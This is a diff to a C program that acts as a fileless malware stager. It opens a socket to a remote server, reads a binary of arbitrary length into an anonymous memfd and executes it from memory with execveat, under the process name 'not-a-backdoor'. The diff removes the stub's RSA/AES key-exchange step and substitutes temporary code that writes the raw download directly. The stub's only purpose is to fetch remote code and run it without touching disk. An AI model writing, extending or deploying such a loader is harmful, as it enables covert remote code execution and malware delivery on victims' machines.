@@ -1,36 +1,36 @@
-#include <linux/fcntl.h>
-#include <linux/memfd.h>
-#include <linux/unistd.h>
+#define _GNU_SOURCE
+
+#include <diet/fcntl.h>
+#include <diet/stdlib.h>
+#include <diet/unistd.h>
 
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <netinet/tcp.h>
-#include <openssl/aes.h>
-#include <openssl/rsa.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/socket.h>
-#include <unistd.h>
+// #include <openssl/aes.h>
+// #include <openssl/rsa.h>
+
+#include "execveat.h"
 
 // #define DEBUG
 
 #define KEY_LENGTH  4096
 #define PUB_EXP     65537
 #ifdef DEBUG
+    #include <diet/stdio.h>
     #define D(x) x
 #else
-    #define D(x) 
+    #define D(x)
 #endif
 
 
-__always_inline static int custom_memfd_create(void)
-{
-    return syscall(__NR_memfd_create, "", (unsigned int)(MFD_CLOEXEC));
-}
+// static int custom_memfd_create(void)
+// {
+//     return syscall(__NR_memfd_create, "", (unsigned int)(MFD_CLOEXEC));
+// }
 
 
-__always_inline static int write_with_len(int s, uint8_t *buf, size_t buf_len)
+static int write_with_len(int s, uint8_t *buf, size_t buf_len)
 {
     uint32_t buf_len_u = buf_len;
     ssize_t buf_with_len_len = sizeof(buf_len_u) + buf_len;
@@ -44,12 +44,12 @@ __always_inline static int write_with_len(int s, uint8_t *buf, size_t buf_len)
         D(printf("[line %i] write() failed: %li != %lu\n", __LINE__, write_result, buf_with_len_len));
         return 1;
     }
-    
+
     return 0;
 }
 
 
-__always_inline static uint8_t* read_with_len(int s, ssize_t len)
+static uint8_t* read_with_len(int s, ssize_t len)
 {
     uint8_t *read_buf = malloc(len);
     ssize_t num_read = 0;
@@ -72,7 +72,7 @@ __always_inline static uint8_t* read_with_len(int s, ssize_t len)
 }
 
 
-__always_inline static uint8_t* read_unknown_len(int s, ssize_t *num_read_on_success)
+static uint8_t* read_unknown_len(int s, ssize_t *num_read_on_success)
 {
     uint32_t len = 0;
     ssize_t read_result = read(s, &len, sizeof(len));
@@ -92,7 +92,8 @@ __always_inline static uint8_t* read_unknown_len(int s, ssize_t *num_read_on_suc
 }
 
 
-__always_inline static int aes_cbc_decrypt(uint8_t *aes_key_buf, uint8_t *iv, uint8_t *buf, ssize_t buf_len)
+/*
+static int aes_cbc_decrypt(uint8_t *aes_key_buf, uint8_t *iv, uint8_t *buf, ssize_t buf_len)
 {
     if (buf_len % 16 != 0)
     {
@@ -103,9 +104,10 @@ __always_inline static int aes_cbc_decrypt(uint8_t *aes_key_buf, uint8_t *iv, ui
     AES_set_decrypt_key(aes_key_buf, 256, &aes_key_expanded);
     AES_cbc_encrypt(buf, buf, buf_len, &aes_key_expanded, iv, 0);
 }
+*/
 
 
-__always_inline static int download(int fd)
+static int download(int fd)
 {
     int s = socket(AF_INET, SOCK_STREAM, 0);
     struct timeval timeout;
@@ -129,6 +131,27 @@ __always_inline static int download(int fd)
         return 1;
     }
 
+    // TEMP_CODE
+    ssize_t binary_buf_len = 0;
+    uint8_t *binary_buf = read_unknown_len(s, &binary_buf_len);
+    if (binary_buf == NULL)
+    {
+        D(printf("Error reading binary_buf\n"));
+        close(s);
+        return 1;
+    }
+
+    ssize_t write_result = write(fd, binary_buf, binary_buf_len);
+    if (write_result != binary_buf_len)
+    {
+        D(printf("[line %i] write() failed: %li != %lu\n", __LINE__, write_result, binary_buf_len));
+        return 1;
+    }
+
+    return 0;
+    // END TEMP_CODE
+
+    /*
     RSA *rsa_keys = RSA_generate_key(KEY_LENGTH, PUB_EXP, NULL, NULL);
     uint8_t *public_key_buf = NULL;
     int public_key_len = i2d_RSAPublicKey(rsa_keys, &public_key_buf);
@@ -190,20 +213,15 @@ __always_inline static int download(int fd)
     }
 
     D(printf("%s\n", binary_buf));
+    */
 
     return 0;
 }
 
 
-__always_inline static int custom_fexecve(int fd, char **new_argv, char **new_env)
-{
-    syscall(__NR_execveat, fd, "", new_argv, new_env, AT_EMPTY_PATH);
-}
-
-
 int main()
 {
-    int mem_fd = custom_memfd_create();
+    int mem_fd = memfd_create("", (unsigned int)(MFD_CLOEXEC));
     int download_result = download(mem_fd);
 
     if (download_result != 0)
@@ -212,9 +230,9 @@ int main()
         return 1;
     }
 
-    char *new_argv[] = {"not-a-backdoor", NULL};
-    char *new_env[] = { NULL };
-    custom_fexecve(mem_fd, new_argv, new_env);
+    const char *new_argv[] = {"not-a-backdoor", NULL};
+    const char *new_env[] = { NULL };
+    execveat(mem_fd, "", new_argv, new_env, AT_EMPTY_PATH);
 
     return 0;
 }
